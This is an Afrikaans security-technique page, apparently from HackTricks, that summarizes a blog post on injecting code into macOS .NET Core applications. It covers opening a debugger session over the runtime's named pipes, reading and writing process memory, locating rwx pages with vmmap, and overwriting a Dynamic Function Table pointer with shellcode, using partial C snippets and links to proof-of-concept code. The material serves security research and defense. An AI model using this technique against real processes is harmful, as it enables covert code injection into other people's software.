# macOS .Net Toepassings Inspuiting

{{#include ../../../banners/hacktricks-training.md}}

**Dit is 'n opsomming van die pos [https://blog.xpnsec.com/macos-injection-via-third-party-frameworks/](https://blog.xpnsec.com/macos-injection-via-third-party-frameworks/). Kyk daarna vir verdere besonderhede!**

## .NET Kern Foutopsporing <a href="#net-core-debugging" id="net-core-debugging"></a>

### **Oopstel van 'n Foutopsporing Sessie** <a href="#net-core-debugging" id="net-core-debugging"></a>

Die hantering van kommunikasie tussen die foutopsporing en die foutopsporing doelwit in .NET word bestuur deur [**dbgtransportsession.cpp**](https://github.com/dotnet/runtime/blob/0633ecfb79a3b2f1e4c098d1dd0166bc1ae41739/src/coreclr/debug/shared/dbgtransportsession.cpp). Hierdie komponent stel twee benoemde pype per .NET proses op soos gesien in [dbgtransportsession.cpp#L127](https://github.com/dotnet/runtime/blob/0633ecfb79a3b2f1e4c098d1dd0166bc1ae41739/src/coreclr/debug/shared/dbgtransportsession.cpp#L127), wat geinitieer word via [twowaypipe.cpp#L27](https://github.com/dotnet/runtime/blob/0633ecfb79a3b2f1e4c098d1dd0166bc1ae41739/src/coreclr/debug/debug-pal/unix/twowaypipe.cpp#L27). Hierdie pype is gesuffikseerd met **`-in`** en **`-out`**.

Deur die gebruiker se **`$TMPDIR`** te besoek, kan 'n mens foutopsporing FIFOs vind wat beskikbaar is vir die foutopsporing van .Net toepassings.

[**DbgTransportSession::TransportWorker**](https://github.com/dotnet/runtime/blob/0633ecfb79a3b2f1e4c098d1dd0166bc1ae41739/src/coreclr/debug/shared/dbgtransportsession.cpp#L1259) is verantwoordelik vir die bestuur van kommunikasie van 'n foutopsporing. Om 'n nuwe foutopsporing sessie te begin, moet 'n foutopsporing 'n boodskap via die `out` pyp stuur wat begin met 'n `MessageHeader` struktuur, soos in die .NET bronskode uiteengesit:
```c
struct MessageHeader {
MessageType   m_eType;        // Message type
DWORD         m_cbDataBlock;  // Size of following data block (can be zero)
DWORD         m_dwId;         // Message ID from sender
DWORD         m_dwReplyId;    // Reply-to Message ID
DWORD         m_dwLastSeenId; // Last seen Message ID by sender
DWORD         m_dwReserved;   // Reserved for future (initialize to zero)
union {
struct {
DWORD         m_dwMajorVersion;   // Requested/accepted protocol version
DWORD         m_dwMinorVersion;
} VersionInfo;
...
} TypeSpecificData;
BYTE          m_sMustBeZero[8];
}
```
Om 'n nuwe sessie aan te vra, word hierdie struktuur soos volg ingevul, wat die boodskap tipe op `MT_SessionRequest` stel en die protokol weergawe op die huidige weergawe:
```c
static const DWORD kCurrentMajorVersion = 2;
static const DWORD kCurrentMinorVersion = 0;

// Configure the message type and version
sSendHeader.m_eType = MT_SessionRequest;
sSendHeader.TypeSpecificData.VersionInfo.m_dwMajorVersion = kCurrentMajorVersion;
sSendHeader.TypeSpecificData.VersionInfo.m_dwMinorVersion = kCurrentMinorVersion;
sSendHeader.m_cbDataBlock = sizeof(SessionRequestData);
```
Hierdie kop is dan na die teiken gestuur met die `write` syscall, gevolg deur die `sessionRequestData` struktuur wat 'n GUID vir die sessie bevat:
```c
write(wr, &sSendHeader, sizeof(MessageHeader));
memset(&sDataBlock.m_sSessionID, 9, sizeof(SessionRequestData));
write(wr, &sDataBlock, sizeof(SessionRequestData));
```
'n Leesoperasie op die `out` pyp bevestig die sukses of mislukking van die debugging-sessie se totstandkoming:
```c
read(rd, &sReceiveHeader, sizeof(MessageHeader));
```
## Geheue Lees

Sodra 'n foutopsporing sessie gevestig is, kan geheue gelees word met behulp van die [`MT_ReadMemory`](https://github.com/dotnet/runtime/blob/f3a45a91441cf938765bafc795cbf4885cad8800/src/coreclr/src/debug/shared/dbgtransportsession.cpp#L1896) boodskap tipe. Die funksie readMemory is gedetailleerd, en voer die nodige stappe uit om 'n leesversoek te stuur en die antwoord te verkry:
```c
bool readMemory(void *addr, int len, unsigned char **output) {
// Allocation and initialization
...
// Write header and read response
...
// Read the memory from the debuggee
...
return true;
}
```
Die volledige bewys van konsep (POC) is beskikbaar [hier](https://gist.github.com/xpn/95eefc14918998853f6e0ab48d9f7b0b).

## Skryf Geheue

Net so kan geheue geskryf word met die `writeMemory` funksie. Die proses behels om die boodskap tipe op `MT_WriteMemory` te stel, die adres en lengte van die data te spesifiseer, en dan die data te stuur:
```c
bool writeMemory(void *addr, int len, unsigned char *input) {
// Increment IDs, set message type, and specify memory location
...
// Write header and data, then read the response
...
// Confirm memory write was successful
...
return true;
}
```
Die geassosieerde POC is beskikbaar [hier](https://gist.github.com/xpn/7c3040a7398808747e158a25745380a5).

## .NET Core Kode Uitvoering <a href="#net-core-code-execution" id="net-core-code-execution"></a>

Om kode uit te voer, moet 'n geheuegebied met rwx-toestemmings geïdentifiseer word, wat gedoen kan word met vmmap -pages:
```bash
vmmap -pages [pid]
vmmap -pages 35829 | grep "rwx/rwx"
```
'n Plek om 'n funksie-aanwyser te oorskryf, is nodig, en in .NET Core kan dit gedoen word deur die **Dynamiese Funksietabel (DFT)** te teiken. Hierdie tabel, wat in [`jithelpers.h`](https://github.com/dotnet/runtime/blob/6072e4d3a7a2a1493f514cdf4be75a3d56580e84/src/coreclr/src/inc/jithelpers.h) beskryf word, word deur die runtime gebruik vir JIT-kompilasie-hulpfunksies.

Vir x64-stelsels kan handtekeningjag gebruik word om 'n verwysing na die simbool `_hlpDynamicFuncTable` in `libcorclr.dll` te vind.

Die `MT_GetDCB` debuggingsfunksie verskaf nuttige inligting, insluitend die adres van 'n hulpfunksie, `m_helperRemoteStartAddr`, wat die ligging van `libcorclr.dll` in die prosesgeheue aandui. Hierdie adres word dan gebruik om 'n soektog na die DFT te begin en 'n funksie-aanwyser met die shellcode se adres te oorskryf.

Die volledige POC-kode vir inspuiting in PowerShell is beskikbaar [hier](https://gist.github.com/xpn/b427998c8b3924ab1d63c89d273734b6).

## Verwysings

- [https://blog.xpnsec.com/macos-injection-via-third-party-frameworks/](https://blog.xpnsec.com/macos-injection-via-third-party-frameworks/)

{{#include ../../../banners/hacktricks-training.md}}
